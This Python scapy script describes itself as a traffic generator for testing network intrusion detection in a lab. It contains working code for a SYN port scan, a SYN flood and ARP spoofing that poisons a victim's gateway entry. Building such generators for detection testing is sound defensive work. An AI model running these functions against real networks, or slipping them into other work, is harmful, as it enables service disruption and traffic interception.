import argparse
import random
import time

from scapy.all import ARP, Ether, IP, RandMAC, TCP, UDP, send, sendp


def send_port_scan(target_ip: str, start_port: int, count: int, delay: float, iface: str | None) -> None:
    print(f"[+] Sending port-scan-like traffic to {target_ip} on {count} ports...")
    for i in range(count):
        dport = start_port + i
        pkt = IP(dst=target_ip) / TCP(dport=dport, flags="S")
        send(pkt, iface=iface, verbose=False)
        if delay > 0:
            time.sleep(delay)
    print("[+] Port scan simulation complete.")


def send_syn_flood(target_ip: str, target_port: int, count: int, delay: float, iface: str | None) -> None:
    print(f"[+] Sending SYN-flood-like traffic to {target_ip}:{target_port} ({count} packets)...")
    for _ in range(count):
        sport = random.randint(1024, 65535)
        pkt = IP(dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")
        send(pkt, iface=iface, verbose=False)
        if delay > 0:
            time.sleep(delay)
    print("[+] SYN flood simulation complete.")


def send_arp_spoof_like(
    victim_ip: str,
    gateway_ip: str,
    fake_mac: str | None,
    repeat: int,
    delay: float,
    iface: str | None,
) -> None:
    print(
        "[+] Sending ARP-spoof-like frames (for lab testing only). "
        f"Claiming {gateway_ip} is-at fake MAC toward {victim_ip}."
    )

    attacker_mac = fake_mac or str(RandMAC())
    for _ in range(repeat):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac) / ARP(
            op=2,
            psrc=gateway_ip,
            pdst=victim_ip,
            hwsrc=attacker_mac,
            hwdst="00:00:00:00:00:00",
        )
        sendp(pkt, iface=iface, verbose=False)
        if delay > 0:
            time.sleep(delay)

    print(f"[+] ARP spoof simulation complete. Fake MAC used: {attacker_mac}")


def run_all(args: argparse.Namespace) -> None:
    send_port_scan(args.target_ip, args.start_port, args.port_count, args.delay, args.iface)
    send_syn_flood(args.target_ip, args.target_port, args.syn_count, args.delay, args.iface)
    send_arp_spoof_like(
        args.victim_ip,
        args.gateway_ip,
        args.fake_mac,
        args.arp_repeat,
        args.delay,
        args.iface,
    )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Synthetic traffic generator for NIDS lab testing")
    parser.add_argument(
        "--mode",
        choices=["portscan", "synflood", "arpspoof", "all"],
        default="all",
        help="Traffic pattern to generate",
    )

    parser.add_argument("--iface", default=None, help="Network interface (optional)")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between packets in seconds")

    parser.add_argument("--target-ip", default="127.0.0.1", help="Target host for TCP tests")
    parser.add_argument("--target-port", type=int, default=80, help="Target port for SYN flood simulation")

    parser.add_argument("--start-port", type=int, default=1, help="Starting port for port scan simulation")
    parser.add_argument("--port-count", type=int, default=15, help="Number of destination ports to hit")

    parser.add_argument("--syn-count", type=int, default=200, help="Number of SYN packets to send")

    parser.add_argument("--victim-ip", default="192.168.1.10", help="ARP victim IP")
    parser.add_argument("--gateway-ip", default="192.168.1.1", help="Spoofed gateway IP")
    parser.add_argument("--fake-mac", default=None, help="Optional fake MAC for ARP replies")
    parser.add_argument("--arp-repeat", type=int, default=5, help="Number of spoof ARP replies to send")

    return parser.parse_args()


def main() -> None:
    args = parse_args()

    if args.mode == "portscan":
        send_port_scan(args.target_ip, args.start_port, args.port_count, args.delay, args.iface)
    elif args.mode == "synflood":
        send_syn_flood(args.target_ip, args.target_port, args.syn_count, args.delay, args.iface)
    elif args.mode == "arpspoof":
        send_arp_spoof_like(
            args.victim_ip,
            args.gateway_ip,
            args.fake_mac,
            args.arp_repeat,
            args.delay,
            args.iface,
        )
    else:
        run_all(args)


if __name__ == "__main__":
    main()
